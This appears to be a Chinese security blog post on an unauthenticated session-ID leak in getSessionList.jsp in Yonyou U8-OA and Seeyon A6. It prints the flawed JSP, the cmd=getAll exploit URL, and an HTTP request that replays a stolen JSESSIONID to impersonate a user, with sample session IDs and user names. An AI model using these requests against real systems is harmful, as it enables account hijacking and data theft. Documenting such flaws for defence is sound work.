<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/_FMSL1nbpgoKJU1R52EM1g)

![](https://mmbiz.qpic.cn/mmbiz_gif/7QRTvkK2qC4O4dl1Y2a9LqiatyWWqR5TBWaDXM0urygClfibLafuVPWuLTpG6XGf1RlxhKke6Km9ys61OSkRiagzw/640?wx_fmt=gif&wxfrom=5&wx_lazy=1)

 **文章声明**

  

安全技术类文章仅供参考，此文所提供的信息仅针对漏洞靶场进行渗透，未经授权请勿利用文章中的技术手段对任何计算机系统进行入侵操作。

本文所提供的工具仅用于学习，禁止用于其他目的，推荐大家在了解技术原理的前提下，更好的维护个人信息安全、企业安全、国家安全。

一、漏洞简介
------

用友 U8-OA 和致远 A6 系统中的 getSessionList.jsp 文件存在漏洞，攻击者可利用该漏洞获取到所有用户的 SessionID，利用泄露的 SessionID 即可伪造用户身份登录系统获取权限。

二、漏洞成因
------

`getSessionList.jsp`存在缺陷

```
<%@ page contentType="text/html;charset=GBK"%>
<%@ page session= "false" %>
<%@ page import="net.btdz.oa.ext.https.*"%>
<%
    String reqType = request.getParameter("cmd");
    String outXML = "";
    boolean allowHttps = true;
    if("allowHttps".equalsIgnoreCase(reqType)){
        //add code to judge whether it allow https or not
        allowHttps = FetchSessionList.checkHttps();
        if (allowHttps) response.setHeader("AllowHttps","1");
    }
    if("getAll".equalsIgnoreCase(reqType)){
        outXML = FetchSessionList.getXMLAll();
    }
    else if("getSingle".equalsIgnoreCase(reqType)){
        String sessionId = request.getParameter("ssid");
        if(sessionId != null){
            outXML = FetchSessionList.getXMLBySessionId(sessionId);
        }
    }
    else{
        outXML += "<?xml version=\"1.0\" encoding=\"GB2312\"?>\r\n";
        outXML += "<SessionList>\r\n";
//        outXML += "<Session>\r\n";
//        outXML += "</Session>\r\n";
        outXML += "</SessionList>\r\n";
    }
    out.println(outXML);
%>
```

该文件没有权限验证，当 cmd 参数为 getAll 时，便可获取到所有用户的 SessionID。

三、漏洞复现
------

### 用友 U8-OA

系统首页显示如下

```
http://xx.xx.xx.xx/yyoa/index.jsp
```

![](https://mmbiz.qpic.cn/mmbiz_jpg/szicQ7q9y2nNAVV3aBsqmkRd7Yfc4ZRE5wFBTchr73Gg86pQiabtNHqjxc2fI4hwB5BqKFRuwHakNu4BbezNAZjw/640?wx_fmt=jpeg)

访问下列地址获取用户 sessionid 的值  

```
http://xx.xx.xx.xx/yyoa/ext/https/getSessionList.jsp?cmd=getAll
```

![](https://mmbiz.qpic.cn/mmbiz_jpg/szicQ7q9y2nNAVV3aBsqmkRd7Yfc4ZRE56oTbgAHLOEAcvhRBvRibjwN0qCmFQ00MkBU43iaqrlzRwc5kHg3H6Cew/640?wx_fmt=jpeg)

这里以`dxf 010581FB90ADEFAF718FB07DF53AC294`为目标

获取 SESSION 之后访问：`/yyoa/common/js/menu/menu.jsp`，然后替换 Cookie

```
GET /yyoa/common/js/menu/menu.jsp HTTP/1.1
Host: xx.xx.xx.xx
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie:JSESSIONID=010581FB90ADEFAF718FB07DF53AC294
Connection: close
```

![](https://mmbiz.qpic.cn/mmbiz_jpg/szicQ7q9y2nNAVV3aBsqmkRd7Yfc4ZRE576OqcSMPiaP7T1ptAvg2oiauC3VUd6auLDxzqGzXNVPcZK0th8dFXqKQ/640?wx_fmt=jpeg)

根据响应包中用户的名字和前面得到的用户名 dxf 对比可发现系统账号是用户姓名的首字母，也证明了成功伪造该用户的身份登录了系统。

### 致远 A6 系统

系统首页显示如下

```
http://xx.xx.xx.xx/yyoa/index.jsp
```

![](https://mmbiz.qpic.cn/mmbiz_jpg/szicQ7q9y2nNAVV3aBsqmkRd7Yfc4ZRE5OzhypicBtV1R3n7qpqgWA6houicqtPQJsljKc1iadib9NEsbnCnVHaralA/640?wx_fmt=jpeg)

同样访问下列地址获取用户 sessionid 的值  

```
http://xx.xx.xx.xx/yyoa/ext/https/getSessionList.jsp?cmd=getAll
```

![](https://mmbiz.qpic.cn/mmbiz_jpg/szicQ7q9y2nNAVV3aBsqmkRd7Yfc4ZRE5fdFshhDtZtV3ibWOeCusRPSKAJbQZk7MPFaI6Xia6qh5Xs1hxZ4xI7UQ/640?wx_fmt=jpeg)

这里以`李燕 F3DD5D8269C46BF09137F30A8816BAFD`为目标

获取 SESSION 之后访问：`/yyoa/common/js/menu/menu.jsp`，然后替换 Cookie

![](https://mmbiz.qpic.cn/mmbiz_jpg/szicQ7q9y2nNAVV3aBsqmkRd7Yfc4ZRE5Lz9xWnq048CEicIF2ShkZs4Abe4segEep8iapTnrmvzia88YhDWLoqwGg/640?wx_fmt=jpeg)